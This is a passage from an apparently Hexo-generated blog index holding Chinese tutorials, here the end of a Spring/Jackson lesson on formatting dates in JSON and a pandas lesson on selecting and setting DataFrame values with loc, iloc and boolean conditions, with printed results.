class="type">SimpleDateFormat</span> simpleDateFormat = new <span class="type">SimpleDateFormat</span>(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">        <span class="comment">//3.让mapper指定时间日期格式为simpleDateFormat</span></span><br><span class="line">        mapper.setDateFormat(simpleDateFormat);</span><br><span class="line">        <span class="comment">//4.写一个日期对象</span></span><br><span class="line">        <span class="type">Date</span> date = new <span class="type">Date</span>();</span><br><span class="line">        <span class="keyword">return</span> mapper.writeValueAsString(date);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">"2021<span class="selector-tag">-03-09</span> 18<span class="selector-pseudo">:45</span><span class="selector-pseudo">:10"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="封装成工具类"><a href="#封装成工具类" class="headerlink" title="封装成工具类"></a>封装成工具类</h3><p>发现问题，重复代码太多，给它编写一个工具类JsonUtils<br><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> getJson(Object object)&#123;</span><br><span class="line">        <span class="keyword">return</span> getJson(object,<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> getJson(Object object,<span class="keyword">String</span> dateFormat)&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> <span class="type">ObjectMapper</span>();</span><br><span class="line">        <span class="comment">//1.如何让他不返回时间戳:关闭时间戳功能</span></span><br><span class="line">        mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//2.时间格式化问题</span></span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> <span class="type">SimpleDateFormat</span>(dateFormat);</span><br><span class="line">        <span class="comment">//3.让mapper指定时间日期格式为simpleDateFormat</span></span><br><span class="line">        mapper.setDateFormat(simpleDateFormat);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mapper.writeValueAsString(object);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>再修改Controller<br><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">package com.ceit.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.ceit.utils.JsonUtils;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.SerializationFeature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.DateFormat;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line">@<span class="type">Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    @<span class="type">RequestMapping</span>(value = <span class="string">"/time3"</span>)</span><br><span class="line">    @<span class="type">ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> json6() <span class="keyword">throws</span> <span class="type">JsonProcessingException</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> date = new <span class="type">Date</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="type">JsonUtils</span>.getJson(date);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这样代码就非常简洁美观了<br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">"2021<span class="selector-tag">-03-09</span> 18<span class="selector-pseudo">:55</span><span class="selector-pseudo">:37"</span></span><br></pre></td></tr></table></figure></p>
<p><a href="/download/JSON.zip">源码下载</a></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>前端开发</category>
        <category>JSON</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2021/2/22-pandas</title>
    <url>/2021/02/24/Python3-2021-2-22-pandas/</url>
    <content><![CDATA[<h1 id="选择数据"><a href="#选择数据" class="headerlink" title="选择数据"></a>选择数据</h1><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"A列的数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df[<span class="string">'A'</span>],df.A)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"0-3下标，20130102到20130104行"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df[<span class="number">0</span>:<span class="number">3</span>],df[<span class="string">'20130102'</span>:<span class="string">'20130104'</span>])</span></span> #可以通过下标来截取 也可以通过标签来选取</span><br></pre></td></tr></table></figure>
<p>既可以通过下标来截取 也可以通过标签来选取</p>
<p>运行结果：<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">df数据</span></span><br><span class="line">             <span class="string">A</span>   <span class="string">B</span>   <span class="string">C</span>   <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line"><span class="string">A列的数据</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>     <span class="number">0</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>     <span class="number">4</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>     <span class="number">8</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>    <span class="number">12</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>    <span class="number">16</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>    <span class="number">20</span></span><br><span class="line"><span class="attr">Freq:</span> <span class="string">D,</span> <span class="attr">Name:</span> <span class="string">A,</span> <span class="attr">dtype:</span> <span class="string">int32</span> <span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>     <span class="number">0</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>     <span class="number">4</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>     <span class="number">8</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>    <span class="number">12</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>    <span class="number">16</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>    <span class="number">20</span></span><br><span class="line"><span class="attr">Freq:</span> <span class="string">D,</span> <span class="attr">Name:</span> <span class="string">A,</span> <span class="attr">dtype:</span> <span class="string">int32</span></span><br><span class="line"><span class="number">0</span><span class="number">-3</span><span class="string">下标，20130102到20130104行</span></span><br><span class="line">            <span class="string">A</span>  <span class="string">B</span>   <span class="string">C</span>   <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>  <span class="number">0</span>  <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>  <span class="number">4</span>  <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>  <span class="number">8</span>  <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span>              <span class="string">A</span>   <span class="string">B</span>   <span class="string">C</span>   <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br></pre></td></tr></table></figure></p>
<h2 id="loc"><a href="#loc" class="headerlink" title="loc"></a>loc</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,<span class="attribute">periods</span>=6)</span><br><span class="line">df = pd.DataFrame(np.arange(24).reshape((6,4)),<span class="attribute">index</span>=dates,columns=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df数据"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># select by label: loc</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"以标签名义选择20130102"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df.loc[<span class="string">'20130102'</span>]) #以标签的名义来选择</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"保留所有行  选取A B两列"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df.loc[:,[<span class="string">'A'</span>,<span class="string">'B'</span>]]) #保留所有行 选取A B两列</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">以标签名义选择<span class="number">20130102</span></span><br><span class="line">A    <span class="number">4</span></span><br><span class="line">B    <span class="number">5</span></span><br><span class="line">C    <span class="number">6</span></span><br><span class="line">D    <span class="number">7</span></span><br><span class="line">Name: <span class="number">2013</span><span class="number">-01</span><span class="number">-02</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, dtype: <span class="built_in">int</span>32</span><br><span class="line">保留所有行  选取A B两列</span><br><span class="line">             A   B</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span></span><br></pre></td></tr></table></figure></p>
<h2 id="iloc"><a href="#iloc" class="headerlink" title="iloc"></a>iloc</h2><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,<span class="attribute">periods</span>=6)</span><br><span class="line">df = pd.DataFrame(np.arange(24).reshape((6,4)),<span class="attribute">index</span>=dates,columns=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df数据"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># select by position: iloc</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"以下标选择 下标为3的数据"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df.iloc[3]) #以下标选择</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"选下标3到5行 下标1到3列的数据 左包含右不包含"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df.iloc[3:5,1:3]) #选下标3到5行 下标1到3列的数据 左包含右不包含</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">以下标选择 下标为<span class="number">3</span>的数据</span><br><span class="line">A    <span class="number">12</span></span><br><span class="line">B    <span class="number">13</span></span><br><span class="line">C    <span class="number">14</span></span><br><span class="line">D    <span class="number">15</span></span><br><span class="line">Name: <span class="number">2013</span><span class="number">-01</span><span class="number">-04</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>, dtype: <span class="built_in">int</span>32</span><br><span class="line">选下标<span class="number">3</span>到<span class="number">5</span>行 下标<span class="number">1</span>到<span class="number">3</span>列的数据 左包含右不包含</span><br><span class="line">             B   C</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">13</span>  <span class="number">14</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">17</span>  <span class="number">18</span></span><br></pre></td></tr></table></figure></p>
<h2 id="条件选择"><a href="#条件选择" class="headerlink" title="条件选择"></a>条件选择</h2><p>可以通过表达式来进行选择<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,<span class="attribute">periods</span>=6)</span><br><span class="line">df = pd.DataFrame(np.arange(24).reshape((6,4)),<span class="attribute">index</span>=dates,columns=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df数据"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Boolean indexing</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"以条件来筛选 选出df A列中所有大于8的数据 BCD列也会显示出来"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df[df.A &gt; 8]) #以条件来筛选 选出df A列中所有大于8的数据 BCD列也会显示出来</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">以条件来筛选 选出df A列中所有大于<span class="number">8</span>的数据 BCD列也会显示出来</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h1 id="设置值"><a href="#设置值" class="headerlink" title="设置值"></a>设置值</h1><p>同样可以用loc和iloc来进行选取 并设置<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"通过iloc选取设置"</span>)</span></span></span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">2</span>,<span class="number">2</span>] = <span class="number">1111</span>  #以下标设置值</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"通过loc选取设置"</span>)</span></span></span><br><span class="line">df<span class="selector-class">.loc</span>[<span class="string">'20130101'</span>,<span class="string">'B'</span>] = <span class="number">222</span>  #以标签设置值</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">通过iloc选取设置</span><br><span class="line">             A   B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>     <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>     <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">1111</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>    <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>    <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>    <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">通过loc选取设置</span><br><span class="line">             A    B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>  <span class="number">222</span>     <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>    <span class="number">5</span>     <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>    <span class="number">9</span>  <span class="number">1111</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>   <span class="number">13</span>    <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>   <span class="number">17</span>    <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>   <span class="number">21</span>    <span class="number">22</span>  <span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>条件语句也同样适用<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"A列大于4的的所有行的数据都变为0"</span>)</span></span></span><br><span class="line">df[df.A&gt;<span class="number">4</span>] = <span class="number">0</span> #A列大于<span class="number">4</span>的的所有行的数据都变为<span class="number">0</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">A列大于<span class="number">4</span>的的所有行的数据都变为<span class="number">0</span></span><br><span class="line">            A  B  C  D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>  <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure><br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span 